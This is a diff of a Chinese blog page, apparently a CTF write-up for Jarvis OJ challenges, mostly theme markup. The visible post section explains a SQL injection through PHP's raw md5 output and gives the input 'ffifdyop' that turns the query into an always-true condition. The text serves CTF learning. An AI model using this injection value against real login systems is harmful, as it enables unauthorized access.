@@ -1,497 +1,424 @@
 <!DOCTYPE html>
-<html style="display: none;" lang="zh">
-    <head>
-    <meta charset="utf-8">
-    <!--
-        © Material Theme
-        https://github.com/viosey/hexo-theme-material
-        Version: 1.5.2 -->
-    <script>
-        window.materialVersion = "1.5.2"
-        // Delete localstorage with these tags
-        window.oldVersion = [
-            'codestartv1',
-            '1.3.4',
-            '1.4.0',
-            '1.4.0b1',
-            '1.5.0'
-        ]
-    </script>
-
-    <!-- dns prefetch -->
-    <meta http-equiv="x-dns-prefetch-control" content="on">
 
 
 
-
-
-
-
-
-
-
-
-
-
-
-    <!-- Meta & Info -->
-    <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
-    <meta name="renderer" content="webkit">
-    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
-
-    <!-- Title -->
-    
-    <title>
-        
-            Jarvis OJ Writeup | 
-        
-        Cyris | 绿生
-    </title>
-
-    <!-- Favicons -->
-    <link rel="icon shortcut" type="image/ico" href="/img/favicon.png">
-    <link rel="icon" href="/img/favicon.png">
-
-    <meta name="format-detection" content="telephone=no"/>
-    <meta name="description" itemprop="description" content="记录一些 Jarvis OJ 上的题。
-平台地址：https://www.jarvisoj.com/">
-    <meta name="keywords" content="null,CTF">
-    <meta name="theme-color" content="#0097A7">
-
-    <!-- Disable Fucking Bloody Baidu Tranformation -->
-    <meta http-equiv="Cache-Control" content="no-transform" />
-    <meta http-equiv="Cache-Control" content="no-siteapp" />
-
-    <!--[if lte IE 9]>
-        <link rel="stylesheet" href="/css/ie-blocker.css">
-
-        
-            <script src="/js/ie-blocker.zhCN.js"></script>
-        
-    <![endif]-->
-
-    <!-- Import lsloader -->
-    <script>(function(){window.lsloader={jsRunSequence:[],jsnamemap:{},cssnamemap:{}};lsloader.removeLS=function(a){try{localStorage.removeItem(a)}catch(b){}};lsloader.setLS=function(a,c){try{localStorage.setItem(a,c)}catch(b){}};lsloader.getLS=function(a){var c="";try{c=localStorage.getItem(a)}catch(b){c=""}return c};versionString="/*"+(window.materialVersion||"unknownVersion")+"*/";lsloader.clean=function(){try{var b=[];for(var a=0;a<localStorage.length;a++){b.push(localStorage.key(a))}b.forEach(function(e){var f=lsloader.getLS(e);if(window.oldVersion){var d=window.oldVersion.reduce(function(g,h){return g||f.indexOf("/*"+h+"*/")!==-1},false);if(d){lsloader.removeLS(e)}}})}catch(c){}};lsloader.clean();lsloader.load=function(f,a,b,d){if(typeof b==="boolean"){d=b;b=undefined}d=d||false;b=b||function(){};var e;e=this.getLS(f);if(e&&e.indexOf(versionString)===-1){this.removeLS(f);this.requestResource(f,a,b,d);return}if(e){var c=e.split(versionString)[0];if(c!=a){console.log("reload:"+a);this.removeLS(f);this.requestResource(f,a,b,d);return}e=e.split(versionString)[1];if(d){this.jsRunSequence.push({name:f,code:e});this.runjs(a,f,e)}else{document.getElementById(f).appendChild(document.createTextNode(e));b()}}else{this.requestResource(f,a,b,d)}};lsloader.requestResource=function(b,e,a,c){var d=this;if(c){this.iojs(e,b,function(h,f,g){d.setLS(f,h+versionString+g);d.runjs(h,f,g)})}else{this.iocss(e,b,function(f){document.getElementById(b).appendChild(document.createTextNode(f));d.setLS(b,e+versionString+f)},a)}};lsloader.iojs=function(d,b,g){var a=this;a.jsRunSequence.push({name:b,code:""});try{var f=new XMLHttpRequest();f.open("get",d,true);f.onreadystatechange=function(){if(f.readyState==4){if((f.status>=200&&f.status<300)||f.status==304){if(f.response!=""){g(d,b,f.response);return}}a.jsfallback(d,b)}};f.send(null)}catch(c){a.jsfallback(d,b)}};lsloader.iocss=function(f,c,h,a){var b=this;try{var g=new XMLHttpRequest();g.open("get",f,true);g.onreadystatechange=function(){if(g.readyState==4){if((g.status>=200&&g.status<300)||g.status==304){if(g.response!=""){h(g.response);a();return}}b.cssfallback(f,c,a)}};g.send(null)}catch(d){b.cssfallback(f,c,a)}};lsloader.iofonts=function(f,c,h,a){var b=this;try{var g=new XMLHttpRequest();g.open("get",f,true);g.onreadystatechange=function(){if(g.readyState==4){if((g.status>=200&&g.status<300)||g.status==304){if(g.response!=""){h(g.response);a();return}}b.cssfallback(f,c,a)}};g.send(null)}catch(d){b.cssfallback(f,c,a)}};lsloader.runjs=function(f,c,e){if(!!c&&!!e){for(var b in this.jsRunSequence){if(this.jsRunSequence[b].name==c){this.jsRunSequence[b].code=e}}}if(!!this.jsRunSequence[0]&&!!this.jsRunSequence[0].code&&this.jsRunSequence[0].status!="failed"){var a=document.createElement("script");a.appendChild(document.createTextNode(this.jsRunSequence[0].code));a.type="text/javascript";document.getElementsByTagName("head")[0].appendChild(a);this.jsRunSequence.shift();if(this.jsRunSequence.length>0){this.runjs()}}else{if(!!this.jsRunSequence[0]&&this.jsRunSequence[0].status=="failed"){var d=this;var a=document.createElement("script");a.src=this.jsRunSequence[0].path;a.type="text/javascript";this.jsRunSequence[0].status="loading";a.onload=function(){d.jsRunSequence.shift();if(d.jsRunSequence.length>0){d.runjs()}};document.body.appendChild(a)}}};lsloader.tagLoad=function(b,a){this.jsRunSequence.push({name:a,code:"",path:b,status:"failed"});this.runjs()};lsloader.jsfallback=function(c,b){if(!!this.jsnamemap[b]){return}else{this.jsnamemap[b]=b}for(var a in this.jsRunSequence){if(this.jsRunSequence[a].name==b){this.jsRunSequence[a].code="";this.jsRunSequence[a].status="failed";this.jsRunSequence[a].path=c}}this.runjs()};lsloader.cssfallback=function(e,c,b){if(!!this.cssnamemap[c]){return}else{this.cssnamemap[c]=1}var d=document.createElement("link");d.type="text/css";d.href=e;d.rel="stylesheet";d.onload=d.onerror=b;var a=document.getElementsByTagName("script")[0];a.parentNode.insertBefore(d,a)};lsloader.runInlineScript=function(c,b){var a=document.getElementById(b).innerText;this.jsRunSequence.push({name:c,code:a});this.runjs()}})();</script>
-
-    <!-- Import queue -->
-    <script>function Queue(){this.dataStore=[];this.offer=b;this.poll=d;this.execNext=a;this.debug=false;this.startDebug=c;function b(e){if(this.debug){console.log("Offered a Queued Function.")}if(typeof e==="function"){this.dataStore.push(e)}else{console.log("You must offer a function.")}}function d(){if(this.debug){console.log("Polled a Queued Function.")}return this.dataStore.shift()}function a(){var e=this.poll();if(e!==undefined){if(this.debug){console.log("Run a Queued Function.")}e()}}function c(){this.debug=true}}var queue=new Queue();</script>
-
-    <!-- Import CSS -->
-    
-        <style id="material_css"></style><script>if(typeof window.lsLoadCSSMaxNums === "undefined")window.lsLoadCSSMaxNums = 0;window.lsLoadCSSMaxNums++;lsloader.load("material_css","/css/material.min.css?Z7a72R1E4SxzBKR/WGctOA==",function(){if(typeof window.lsLoadCSSNums === "undefined")window.lsLoadCSSNums = 0;window.lsLoadCSSNums++;if(window.lsLoadCSSNums == window.lsLoadCSSMaxNums)document.documentElement.style.display="";}, false)</script>
-        <style id="style_css"></style><script>if(typeof window.lsLoadCSSMaxNums === "undefined")window.lsLoadCSSMaxNums = 0;window.lsLoadCSSMaxNums++;lsloader.load("style_css","/css/style.min.css?MKetZV3cUTfDxvMffaOezg==",function(){if(typeof window.lsLoadCSSNums === "undefined")window.lsLoadCSSNums = 0;window.lsLoadCSSNums++;if(window.lsLoadCSSNums == window.lsLoadCSSMaxNums)document.documentElement.style.display="";}, false)</script>
-
-        
-            
-                <style id="prettify_css"></style><script>if(typeof window.lsLoadCSSMaxNums === "undefined")window.lsLoadCSSMaxNums = 0;window.lsLoadCSSMaxNums++;lsloader.load("prettify_css","/css/prettify.min.css?VbSuLZyOpxJuf3o2tYEOVg==",function(){if(typeof window.lsLoadCSSNums === "undefined")window.lsLoadCSSNums = 0;window.lsLoadCSSNums++;if(window.lsLoadCSSNums == window.lsLoadCSSMaxNums)document.documentElement.style.display="";}, false)</script>
-                <style id="prettify_theme"></style><script>if(typeof window.lsLoadCSSMaxNums === "undefined")window.lsLoadCSSMaxNums = 0;window.lsLoadCSSMaxNums++;lsloader.load("prettify_theme","/css/prettify/tomorrow-night-eighties.min.css?2LJQzURO+Kr8r/fl/T8oMA==",function(){if(typeof window.lsLoadCSSNums === "undefined")window.lsLoadCSSNums = 0;window.lsLoadCSSNums++;if(window.lsLoadCSSNums == window.lsLoadCSSMaxNums)document.documentElement.style.display="";}, false)</script>
-            
-        
-
-    
-
-    
-
-    <!-- Config CSS -->
-
-<!-- Other Styles -->
-<style>
-  body, html {
-    font-family: Roboto, "Helvetica Neue", Helvetica, "PingFang SC", "Hiragino Sans GB", "Microsoft YaHei", "微软雅黑", Arial, sans-serif;
-    overflow-x: hidden !important;
-  }
   
-  code {
-    font-family: Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace;
-  }
-
-  a {
-    color: #4d4d4d;
-  }
-
-  .mdl-card__media,
-  #search-label,
-  #search-form-label:after,
-  #scheme-Paradox .hot_tags-count,
-  #scheme-Paradox .sidebar_archives-count,
-  #scheme-Paradox .sidebar-colored .sidebar-header,
-  #scheme-Paradox .sidebar-colored .sidebar-badge{
-    background-color: #4d4d4d !important;
-  }
-
-  /* Sidebar User Drop Down Menu Text Color */
-  #scheme-Paradox .sidebar-colored .sidebar-nav>.dropdown>.dropdown-menu>li>a:hover,
-  #scheme-Paradox .sidebar-colored .sidebar-nav>.dropdown>.dropdown-menu>li>a:focus {
-    color: #4d4d4d !important;
-  }
-
-  #post_entry-right-info,
-  .sidebar-colored .sidebar-nav li:hover > a,
-  .sidebar-colored .sidebar-nav li:hover > a i,
-  .sidebar-colored .sidebar-nav li > a:hover,
-  .sidebar-colored .sidebar-nav li > a:hover i,
-  .sidebar-colored .sidebar-nav li > a:focus i,
-  .sidebar-colored .sidebar-nav > .open > a,
-  .sidebar-colored .sidebar-nav > .open > a:hover,
-  .sidebar-colored .sidebar-nav > .open > a:focus,
-  #ds-reset #ds-ctx .ds-ctx-entry .ds-ctx-head a {
-    color: #4d4d4d !important;
-  }
-
-  .toTop {
-    background: #757575 !important;
-  }
-
-  .material-layout .material-post>.material-nav,
-  .material-layout .material-index>.material-nav,
-  .material-nav a {
-    color: #757575;
-  }
-
-  #scheme-Paradox .MD-burger-layer {
-    background-color: #757575;
-  }
-
-  #scheme-Paradox #post-toc-trigger-btn {
-    color: #757575;
-  }
-
-  .post-toc a:hover {
-    color: #4d4d4d;
-    text-decoration: underline;
-  }
-
-</style>
 
 
-<!-- Theme Background Related-->
-
-    <style>
-      body{
-        background-color: #F5F5F5;
-      }
-
-      /* blog_info bottom background */
-      #scheme-Paradox .material-layout .something-else .mdl-card__supporting-text{
-        background-color: #fff;
-      }
-    </style>
+<html class="theme-next muse use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
 
 
 
 
-<!-- Fade Effect -->
-
-    <style>
-      .fade {
-        transition: all 800ms linear;
-        -webkit-transform: translate3d(0,0,0);
-        -moz-transform: translate3d(0,0,0);
-        -ms-transform: translate3d(0,0,0);
-        -o-transform: translate3d(0,0,0);
-        transform: translate3d(0,0,0);
-        opacity: 1;
-      }
-
-      .fade.out{
-        opacity: 0;
-      }
-    </style>
-
-
-<!-- Import Font -->
-<!-- Import Roboto -->
-
-    <link href="https://fonts.googleapis.com/css?family=Roboto:300,400,500" rel="stylesheet">
-
-
-<!-- Import Material Icons -->
-
-
-    <style id="material_icons"></style><script>if(typeof window.lsLoadCSSMaxNums === "undefined")window.lsLoadCSSMaxNums = 0;window.lsLoadCSSMaxNums++;lsloader.load("material_icons","/css/material-icons.css?pqhB/Rd/ab0H2+kZp0RDmw==",function(){if(typeof window.lsLoadCSSNums === "undefined")window.lsLoadCSSNums = 0;window.lsLoadCSSNums++;if(window.lsLoadCSSNums == window.lsLoadCSSMaxNums)document.documentElement.style.display="";}, false)</script>
 
 
 
 
-    <!-- Import jQuery -->
-    
-        <script>lsloader.load("jq_js","/js/jquery.min.js?qcusAULNeBksqffqUM2+Ig==", true)</script>
-    
 
-    <!-- WebAPP Icons -->
-    <meta name="mobile-web-app-capable" content="yes">
-    <meta name="application-name" content="Cyris | 绿生">
-    <meta name="msapplication-starturl" content="https://iCyris.github.io/2017/11/04/jarvisoj-wp/">
-    <meta name="msapplication-navbutton-color" content="#0097A7">
-    <meta name="apple-mobile-web-app-capable" content="yes">
-    <meta name="apple-mobile-web-app-title" content="Cyris | 绿生">
-    <meta name="apple-mobile-web-app-status-bar-style" content="black">
-    <link rel="apple-touch-icon" href="/img/favicon.png">
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
 
-    <!-- Site Verification -->
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
     
     
+  
 
-    <!-- RSS -->
+  
+
+  
+
+  
+
+  
+
+  
     
-        
-            <link rel=alternate type="application/atom+xml" href="/atom.xml">
-        
     
-
-    <!-- The Open Graph protocol -->
-    <meta property="og:url" content="https://iCyris.github.io/2017/11/04/jarvisoj-wp/">
-    <meta property="og:type" content="blog">
-    <meta property="og:title" content="Jarvis OJ Writeup | Cyris | 绿生">
-    <meta property="og:image" content="/img/favicon.png">
-    <meta property="og:description" content="记录一些 Jarvis OJ 上的题。
-平台地址：https://www.jarvisoj.com/">
-    <meta property="og:article:tag" content="CTF"> 
-
-    
-        <meta property="article:published_time" content="Sat Nov 04 2017 11:23:21 GMT+0800">
-        <meta property="article:modified_time" content="Sun Apr 01 2018 14:23:49 GMT+0800">
-    
-
-    <!-- The Twitter Card protocol -->
-    <meta name="twitter:card" content="summary_large_image">
-
-    <!-- Add canonical link for SEO -->
-    
-        <link rel="canonical" href="https://iCyris.github.io/2017/11/04/jarvisoj-wp/index.html" />
-    
-
-    <!-- Structured-data for SEO -->
-    
-        
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
 
 
-<script type="application/ld+json">
-{
-    "@context": "https://schema.org",
-    "@type": "BlogPosting",
-    "mainEntityOfPage": "https://iCyris.github.io/2017/11/04/jarvisoj-wp/index.html",
-    "headline": "Jarvis OJ Writeup",
-    "datePublished": "Sat Nov 04 2017 11:23:21 GMT+0800",
-    "dateModified": "Sun Apr 01 2018 14:23:49 GMT+0800",
-    "author": {
-        "@type": "Person",
-        "name": "Cyris",
-        "image": {
-            "@type": "ImageObject",
-            "url": "/img/cyris.png"
-        },
-        "description": "时雨金时，抓住有味。"
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.2" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="CTF," />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="Cyris | 绿生" type="application/atom+xml" />
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.png?v=5.1.2" />
+
+
+
+
+
+
+<meta name="description" content="记录一些 Jarvis OJ 上的题。 平台地址：https://www.jarvisoj.com/">
+<meta name="keywords" content="CTF">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Jarvis OJ Writeup">
+<meta property="og:url" content="https://iCyris.github.io/2017/11/04/jarvisoj-wp/index.html">
+<meta property="og:site_name" content="Cyris | 绿生">
+<meta property="og:description" content="记录一些 Jarvis OJ 上的题。 平台地址：https://www.jarvisoj.com/">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://icyris.github.io/2017/11/04/jarvisoj-wp/1.png">
+<meta property="og:image" content="https://icyris.github.io/2017/11/04/jarvisoj-wp/PHPINFO-1.png">
+<meta property="og:updated_time" content="2018-04-01T06:23:49.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Jarvis OJ Writeup">
+<meta name="twitter:description" content="记录一些 Jarvis OJ 上的题。 平台地址：https://www.jarvisoj.com/">
+<meta name="twitter:image" content="https://icyris.github.io/2017/11/04/jarvisoj-wp/1.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    sidebar: {"position":"left","display":"post","offset":12,"offset_float":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: true,
+    duoshuo: {
+      userId: '0',
+      author: '博主'
     },
-    "publisher": {
-        "@type": "Organization",
-        "name": "Cyris | 绿生",
-        "logo": {
-            "@type":"ImageObject",
-            "url": "/img/favicon.png"
-        }
-    },
-    "keywords": ",CTFnull",
-    "description": "记录一些 Jarvis OJ 上的题。
-平台地址：https://www.jarvisoj.com/",
-}
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
 </script>
 
 
-    
 
-    <!-- Analytics -->
-    
-    
-    
+  <link rel="canonical" href="https://iCyris.github.io/2017/11/04/jarvisoj-wp/"/>
 
-    <!-- Custom Head -->
-    
+
+
+
+
+  <title>Jarvis OJ Writeup | Cyris | 绿生</title>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 </head>
 
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
 
+  
+  
     
-        <body id="scheme-Paradox" class="lazy">
-            <div class="material-layout  mdl-js-layout has-drawer is-upgraded">
-                
+  
 
-                <!-- Main Container -->
-                <main class="material-layout__content" id="main">
+  <div class="container sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
 
-                    <!-- Top Anchor -->
-                    <div id="top"></div>
-
-                    
-                        <!-- Hamburger Button -->
-                        <button class="MD-burger-icon sidebar-toggle">
-                            <span class="MD-burger-layer"></span>
-                        </button>
-                    
-
-                    <!-- Post TOC -->
-
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
     
-    <!-- Back Button -->
-    <!--
-    <div class="material-back" id="backhome-div" tabindex="0">
-        <a class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon"
-           href="#" onclick="window.history.back();return false;"
-           target="_self"
-           role="button"
-           data-upgraded=",MaterialButton,MaterialRipple">
-            <i class="material-icons" role="presentation">arrow_back</i>
-            <span class="mdl-button__ripple-container">
-                <span class="mdl-ripple"></span>
-            </span>
-        </a>
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Cyris | 绿生</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
     </div>
-    -->
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
 
-
-    <!-- Left aligned menu below button -->
-    
-    
-    <button id="post-toc-trigger-btn"
-        class="mdl-button mdl-js-button mdl-button--icon">
-        <i class="material-icons">format_list_numbered</i>
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
     </button>
-
-    <ul class="post-toc-wrap mdl-menu mdl-menu--bottom-left mdl-js-menu mdl-js-ripple-effect" for="post-toc-trigger-btn" style="max-height:80vh; overflow-y:scroll;">
-        <ol class="post-toc"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Web"><span class="post-toc-text">Web</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Login"><span class="post-toc-text">Login</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#api调用"><span class="post-toc-text">api调用</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#神盾局的秘密"><span class="post-toc-text">神盾局的秘密</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#flag在管理员手里"><span class="post-toc-text">flag在管理员手里</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#PHPINFO"><span class="post-toc-text">PHPINFO</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Pwn"><span class="post-toc-text">Pwn</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#XMAN-level0"><span class="post-toc-text">[XMAN]level0</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#XMAN-level1"><span class="post-toc-text">[XMAN]level1</span></a></li></ol></li></ol>
-    </ul>
-    
-
-
-
-
-<!-- Layouts -->
-
-    <!-- Post Module -->
-    <div class="material-post_container">
-
-        <div class="material-post mdl-grid">
-            <div class="mdl-card mdl-shadow--4dp mdl-cell mdl-cell--12-col">
-
-                <!-- Post Header(Thumbnail & Title) -->
-                
-    <!-- Paradox Post Header -->
-    
-        
-            <!-- Random Thumbnail -->
-            <div class="post_thumbnail-random mdl-card__media mdl-color-text--grey-50">
-            <script type="text/ls-javascript" id="post-thumbnail-script">
-    var randomNum = Math.floor(Math.random() * 19 + 1);
-
-    $('.post_thumbnail-random').attr('data-original', '/img/random/material-' + randomNum + '.png');
-    $('.post_thumbnail-random').addClass('lazy');
-</script>
-
-        
-    
-            <p class="article-headline-p">
-                Jarvis OJ Writeup
-            </p>
-        </div>
-
-
-
-
-
-                
-                    <!-- Paradox Post Info -->
-                    <div class="mdl-color-text--grey-700 mdl-card__supporting-text meta">
-
-    <!-- Author Avatar -->
-    <div id="author-avatar">
-        <img src="/img/cyris.png" width="44px" height="44px" alt="Author Avatar"/>
-    </div>
-    <!-- Author Name & Date -->
-    <div>
-        <strong>Cyris</strong>
-        <span>11月 04, 2017</span>
-    </div>
-
-    <div class="section-spacer"></div>
-
-    <!-- Favorite -->
-    <!--
-        <button id="article-functions-like-button" class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon btn-like">
-            <i class="material-icons" role="presentation">favorite</i>
-            <span class="visuallyhidden">favorites</span>
-        </button>
-    -->
-
-    <!-- Qrcode -->
-    
-
-    <!-- Tags (bookmark) -->
-    
-    <button id="article-functions-viewtags-button" class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon">
-        <i class="material-icons" role="presentation">bookmark</i>
-        <span class="visuallyhidden">bookmark</span>
-    </button>
-    <ul class="mdl-menu mdl-menu--bottom-right mdl-js-menu mdl-js-ripple-effect" for="article-functions-viewtags-button">
-        <li class="mdl-menu__item">
-        <a class="post_tag-link" href="/tags/CTF/">CTF</a>
-    </ul>
-    
-
-    <!-- Share -->
-    
-        <button id="article-fuctions-share-button" class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon">
-    <i class="material-icons" role="presentation">share</i>
-    <span class="visuallyhidden">share</span>
-</button>
-<ul class="mdl-menu mdl-menu--bottom-right mdl-js-menu mdl-js-ripple-effect" for="article-fuctions-share-button">
-    
-
-    
-
-    <!-- Share Weibo -->
-    
-
-    <!-- Share Twitter -->
-    
-
-    <!-- Share Facebook -->
-    
-
-    <!-- Share Google+ -->
-    
-
-    <!-- Share LinkedIn -->
-    
-
-    <!-- Share QQ -->
-    
-        <a class="post_share-link" href="http://connect.qq.com/widget/shareqq/index.html?site=Cyris | 绿生&title=Jarvis OJ Writeup&summary=时雨金时，抓住有味。&pics=https://iCyris.github.io/img/favicon.png&url=https://iCyris.github.io/2017/11/04/jarvisoj-wp/index.html" target="_blank">
-            <li class="mdl-menu__item">
-                分享到 QQ
-            </li>
-        </a>
-    
-
-    <!-- Share Telegram -->
-    
-</ul>
-
-    
+  </div>
 </div>
 
-                
+<nav class="site-nav">
+  
 
-                <!-- Post Content -->
-                <div id="post-content" class="mdl-color-text--grey-700 mdl-card__supporting-text fade out">
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="https://cyris.cn" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-sun-o"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-folder"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-links">
+          <a href="/links" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-external-link"></i> <br />
+            
+            友链
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
     
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://iCyris.github.io/2017/11/04/jarvisoj-wp/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Cyris">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/cyris.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Cyris | 绿生">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">Jarvis OJ Writeup</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-11-04T11:23:21+08:00">
+                2017-11-04
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/" itemprop="url" rel="index">
+                    <span itemprop="name">CTF</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
         <p>记录一些 Jarvis OJ 上的题。</p>
 <p>平台地址：<a href="https://www.jarvisoj.com/" target="_blank" rel="noopener">https://www.jarvisoj.com/</a></p>
 <a id="more"></a> 
 <h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="Login"><a href="#Login" class="headerlink" title="Login"></a>Login</h3><p>需要密码才能获得flag哦。     </p>
 <p>题目入口：<a href="http://web.jarvisoj.com:32772/" target="_blank" rel="noopener">http://web.jarvisoj.com:32772/</a></p>
 <p>在 Headers 里找到一条hint：  </p>
-<pre><code>Hint:&quot;select * from `admin` where password=&#39;&quot;.md5($pass,true).&quot;&#39;&quot;
-</code></pre><p>涉及到一个MD5加密后的注入问题。    </p>
+<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hint:"<span class="keyword">select</span> * <span class="keyword">from</span> <span class="symbol">`admin`</span> <span class="keyword">where</span> <span class="keyword">password</span>=<span class="string">'".md5($pass,true)."'</span><span class="string">"</span></span><br></pre></td></tr></table></figure>
+<p>涉及到一个MD5加密后的注入问题。    </p>
 <p>关于这条md5语句我们先来看下php手册中的描述：</p>
 <blockquote>
 <p><strong>Description</strong></p>
@@ -500,8 +427,8 @@
 <p>注: The optional raw_output parameter was added in PHP 5.0.0 and defaults to FALSE</p>
 </blockquote>
 <p>也就是说，如果md5后的hex转换成字符串后，若包含 <code>&#39;or&#39;&lt;trash&gt;</code> 这样的字符串，那整个sql语句就会变成：   </p>
-<pre><code>SELECT * FROM admin WHERE pass = &#39;&#39;or&#39;&lt;trash&gt;&#39;
-</code></pre><p>就可以进行注入了。   </p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM admin WHERE <span class="keyword">pass</span> = <span class="string">''</span>o<span class="string">r'&lt;trash&gt;'</span></span><br></pre></td></tr></table></figure>
+<p>就可以进行注入了。   </p>
 <p>网上找到一个字符串：<code>ffifdyop</code></p>
 <p>md5以后：<code>276f722736c95d99e921722cf9ed621c</code></p>
 <p>再转换成字符串即为<code>&#39;or&#39;&lt;trash&gt;</code>  </p>
@@ -509,258 +436,52 @@
